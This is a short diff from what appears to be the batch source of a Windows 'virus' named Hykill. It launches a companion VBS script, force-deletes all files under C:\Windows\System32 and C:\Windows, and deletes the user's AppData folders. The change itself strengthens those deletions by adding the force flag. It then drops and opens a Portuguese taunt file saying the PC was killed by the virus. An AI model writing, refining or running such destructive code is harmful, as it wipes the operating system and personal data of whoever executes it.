@@ -242,8 +242,8 @@ Start Hykill.vbs
 Start Hykill.vbs
 del /f /s /q "C:\Windows\System32\*.*"
 del /f /s /q "C:\Windows\*.*"
-del /s /q "%UserProfile%\AppData"
-del /s /q "%UserProfile%\AppData\Roaming"
+del /f /s /q "%UserProfile%\AppData"
+del /f /s /q "%UserProfile%\AppData\Roaming"
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
